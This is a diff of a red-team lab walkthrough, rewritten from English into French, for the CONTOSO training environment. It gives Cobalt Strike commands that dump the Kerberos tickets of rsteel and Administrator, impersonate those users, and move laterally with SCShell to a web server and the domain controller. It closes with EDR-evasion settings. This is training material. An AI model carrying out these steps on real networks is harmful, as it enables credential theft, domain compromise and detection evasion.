@@ -1,39 +1,45 @@
-# Lateral Movement Lab
+# Lab — Lateral Movement
 
->The objective of this lab is to impersonate a user/administrator and move laterally using SCShell to jump to another target🖥️.
+Ce lab présente un enchaînement de **Credential Access**, d’**User Impersonation** et de **Lateral Movement** avec Cobalt Strike et SCShell, dans l’environnement CONTOSO.
 
-1. Launch Cobalt Strike and connect to the team server.
+## Usurpation d’identité de `rsteel`
 
-## User Impersonation
+### Charger Kerbeus-BOF
 
-* Impersonate the rsteel user. [User Impersonate Lab](/labs/User-Impersonation-lab.md)  
+Ouvrir **Cobalt Strike > Script Manager > Load** et charger le script Kerbeus-BOF.
 
-
-⚠️ Load Kerbeus-BOF aggressor script if not already loaded:
 ```
 CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 ```
+
+### Identifier les tickets Kerberos
+
+Afficher les processus, puis examiner les tickets Kerberos disponibles dans la session.
 
 ```cs
 ps
 krb_triage
 ```
 
-Look and dump for user: `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  
+### Exporter le TGT de `rsteel`
+
+Rechercher le ticket `krbtgt/CONTOSO.COM` de `rsteel` et afficher son contenu encodé.
 
 ```cs
 krb_dump /user:rsteel /service:krbtgt
 ```
 
-* Save kirbi to attacker desktop
+### Enregistrer le ticket dans un fichier
 
->Copy base64 value and paste to PowerShell command on attacker desktop PowerShell:
+Sur l’**Attacker Desktop**, copier la valeur Base64 à la place du paramètre d’exemple pour créer `rsteel.kirbi`.
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
 ```
 
->Create sacrificial logon session  
+### Utiliser le ticket de `rsteel`
+
+Créer une session de connexion réseau, importer le fichier `.kirbi`, puis vérifier les tickets chargés.
 
 ```cs
 make_token CONTOSO\rsteel FakePass
@@ -43,39 +49,44 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 powerpick klist
 ```
 
->Check Access remote smb resource
+### Vérifier les accès SMB
+
+Contrôler les droits du contexte Kerberos courant sur les partages administratifs des deux machines.
 
 ```cs
 ls \\lon-ws-1\c$
 ls \\lon-dc-1\c$
 ```
 
-----  
+## Lateral Movement vers le serveur web
 
-⚠️ Use Credential Access and User Impersonation method to impersonate user/administrator.  
+### Charger SCShell
 
-## Lateral Movement JUMP to Web Server  
+Dans **Cobalt Strike > Script Manager**, charger `C:\Tools\SCShell\CS-BOF\scshell.cna`. SCShell utilise un payload de service.
 
-1. Load the SCShell Aggressor script.
-    1. Go to **Cobalt Strike > Script Manager**.
-    2. Click **Load**.
-    3. Select `C:\Tools\SCShell\CS-BOF\scshell.cna`.
+### Configurer le processus du payload
 
-1. SCShell uses the service binary payload, so make sure to set the spawnto first.
-    1. `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`
+Définir le processus utilisé par le payload de service.
 
-1. Move laterally to `lon-ws-1` 🖥️  
-  1. `jump scshell64 lon-ws-1 smb`
-  
-⚠️ A new SYSTEM Beacon appear `lon-ws-1`
-    Ignore errors, Advapi32$StartServiceA failed to start the service. 1056  
-    SCshell does not attempt to stop the service first (it assumes it's already stopped).  
-    💡 wait a few minutes and Retry again💡  
+```cs
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+```
 
-## Lateral Movement JUMP to Domain Controller
+### Ouvrir un Beacon sur `lon-ws-1`
 
->Execute on new web server `lon-ws-1` server beacon   
->Establish situation awareness, beacon first commands!  
+Effectuer le Lateral Movement vers le serveur web avec SCShell.
+
+```cs
+jump scshell64 lon-ws-1 smb
+```
+
+Un nouveau Beacon **SYSTEM** est attendu sur `lon-ws-1`. Le message `Advapi32$StartServiceA failed to start the service. 1056` peut apparaître si le service est déjà démarré ; vérifier l’état réel du Beacon avant toute nouvelle tentative.
+
+## Lateral Movement vers le Domain Controller
+
+### Contrôler le Beacon du serveur web
+
+Depuis `lon-ws-1`, vérifier l’identité, les processus, les paramètres de session et les tickets disponibles.
 
 ```
 getuid
@@ -88,7 +99,9 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 krb_triage
 ```
 
->Beacon received output:  
+### Identifier le TGT administrateur
+
+Cette sortie d’exemple montre notamment un TGT `Administrator @ CONTOSO.COM` dans les tickets recensés.
 
 ```
 Action: List Kerberos Tickets (All Users)
@@ -110,19 +123,25 @@ Action: List Kerberos Tickets (All Users)
 --------------------------------------------------------------------------------------------------------------------------
 ```
 
-### Impersonate Administrator on Web Server
+### Exporter le TGT administrateur
+
+Récupérer le ticket `krbtgt` associé à l’utilisateur `Administrator`.
 
 ```
 krb_dump /user:Administrator /service:krbtgt
 ```
 
->Copy base64 ticket value for administrator to PowerShell command to save kirbi file:
+### Enregistrer le ticket administrateur
+
+Sur l’**Attacker Desktop**, remplacer la valeur Base64 d’exemple pour créer `administrator.kirbi`.
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<base64-ticket-administrator>"))
 ```
 
->Use ticket file  
+### Charger le ticket et vérifier les accès
+
+Importer le ticket dans le Beacon, énumérer les ordinateurs et contrôler l’accès SMB au contrôleur de domaine.
 
 ```
 kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
@@ -131,7 +150,9 @@ ldapsearch (objectClass=computer) --attributes name,operatingSystem,dNSHostName
 ls \\lon-dc-1\c$
 ```
 
->Beacon Output:  
+### Examiner le résultat
+
+Exemple de sortie montrant le contenu du partage `C$` de `lon-dc-1`.
 
 ```
 [04/27 13:27:58] [*] Listing: \\lon-dc-1\c$\
@@ -153,20 +174,18 @@ ls \\lon-dc-1\c$
  1gb      fil     04/27/2026 05:57:32   pagefile.sys
 ```
 
-⚠️ Use Credential Access and User Impersonation method to impersonate user/administrator.  
+### Ouvrir un Beacon sur le Domain Controller
 
-## Lateral Movement JUMP to Domain Controller    
-
->On Web server with administrator TGT beacon but the jump originated from LON-WS-1:  
+Depuis le Beacon de `lon-ws-1`, exécuter les commandes de Lateral Movement suivantes.
 
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
 
-### Domain Controller Access  
+### Vérifier le contexte sur `lon-dc-1`
 
->After new beacon appear, interact on new `lon-dc-1` beacon:  
+Après l’apparition du Beacon, vérifier le compte utilisé, le nom de la machine et l’accès au disque. La commande `shell hostname` est signalée **OPSEC-UNSAFE** dans ces notes.
 
 ```bash
 getuid
@@ -174,19 +193,16 @@ shell hostname # OPSEC-🔴UNSAFE
 ls c:\
 ```
 
-⚠️ In this lab, you have learned how to chain credential access, user impersonation, and a lateral movement technique together.
+## Protections présentes dans le lab CRTO
 
-----
+| Processus | Fonction |
+|---|---|
+| `elastic-agent.exe` | Agent EDR Elastic |
+| `elastic-endpoint.exe` | Protection endpoint Elastic |
+| `Sysmon64.exe` | Journalisation des événements système |
+| `MsMpEng.exe` | Microsoft Defender Antivirus |
+| `NisSrv.exe` | Inspection réseau Microsoft Defender |
 
-## 🛡️EDR Stack Present in CRTO EXAM    
+Les créations de processus, les connexions réseau et les named pipes peuvent être journalisés. Adapter les paramètres `ppid`, `spawnto` et `post-ex.pipename` selon les consignes du lab.
 
-| Process | Role |
-|---------|------|
-| `elastic-agent.exe` | Elastic EDR agent🚨 |
-| `elastic-endpoint.exe` | Elastic endpoint protection⛔ |
-| `Sysmon64.exe` | Process/network/pipe telemetry📡 |
-| `MsMpEng.exe` | Windows Defender⛔ |
-| `NisSrv.exe` | Defender Network Inspection❗ |
-
-Every process spawn, named pipe, and 🖥️network connection is logged. `ppid` + `spawnto` +
-custom `post-ex.pipename` in the malleable profile are **required**, not optional.
+---
